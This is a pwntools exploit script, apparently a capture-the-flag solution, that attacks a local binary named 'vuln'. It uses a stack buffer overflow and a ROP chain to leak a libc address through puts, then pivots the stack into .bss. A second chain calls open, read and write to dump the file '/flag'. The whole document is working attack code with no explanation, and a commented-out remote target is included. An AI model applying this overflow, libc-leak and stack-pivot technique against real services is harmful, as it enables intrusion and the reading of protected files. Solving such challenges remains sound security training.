from pwn import *

context.log_level = "debug"
io = process("./vuln")
#io = remote("node5.anna.nssctf.cn", 21408)
elf = ELF("./vuln")
libc = ELF("./libc-2.31.so")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

ret = 0x40101A
rdi_ret = 0x401393
leave_ret = 0x4012BE
leave_rax = 0x4012CF
main = elf.sym["main"]
bss = 0x404100

payload = (
    b"a" * (0x100 + 0x8)
    + p64(ret)
    + p64(rdi_ret)
    + p64(puts_got)
    + p64(puts_plt)
    + p64(main)
)
io.recvuntil(b"task.")
io.send(payload)
puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
print("puts address =", hex(puts_addr))
libc_base = puts_addr - libc.sym["puts"]
print("libc base address =", hex(libc_base))
open_addr = libc_base + libc.sym["open"]
read_addr = libc_base + libc.sym["read"]
write_addr = libc_base + libc.sym["write"]
pop_rdi = libc_base + 0x23B6A
pop_rsi = libc_base + 0x2601F
pop_rdx = libc_base + 0x142C92

payload = b"a" * (0x100) + p64(bss + 0x300 + 0x100) + p64(leave_rax)
io.recvuntil(b"task.")
# gdb.attach(io)
io.send(payload)
raw_input("wait")

# open(path, 0);
payload1 = (
    b"/flag\x00\x00\x00"
    + p64(pop_rdi)
    + p64(bss + 0x300)
    + p64(pop_rsi)
    + p64(0)
    + p64(open_addr)
)

# read(fd, addr, size);
payload1 += (
    p64(pop_rdi)
    + p64(3)
    + p64(pop_rsi)
    + p64(bss + 0x300)
    + p64(pop_rdx)
    + p64(0x100)
    + p64(read_addr)
)

# write(1, addr, size);
payload1 += (
    p64(pop_rdi)
    + p64(1)
    + p64(pop_rsi)
    + p64(bss + 0x300)
    + p64(pop_rdx)
    + p64(0x100)
    + p64(write_addr)
)
payload1 = payload1.ljust(0x100, b"\x00")
payload1 += p64(bss + 0x300) + p64(leave_ret)

io.send(payload1)

io.interactive()
